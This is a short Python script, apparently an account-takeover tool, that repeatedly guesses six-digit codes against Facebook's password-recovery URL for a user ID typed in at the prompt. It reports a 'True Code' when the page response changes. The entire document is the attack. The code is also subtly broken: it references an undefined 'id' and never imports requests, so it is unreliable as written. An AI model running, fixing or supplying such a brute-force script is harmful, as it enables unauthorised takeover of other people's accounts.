import random

target_id = input("> Target ID: ")

while True:
    code = ''.join(random.choices("1234567890", k=6))
    url=f"https://www.facebook.com/recover/password/?u={id}&n={code}&f1=default_recover&sih=0&msgr=0"
    resp=requests.get(url).text
    if '<input type="text" class=' in resp:
      print (f"[>] True Code : {code}")
      exit()
    else:
      print (f"[×] Wrong Code : {code}")
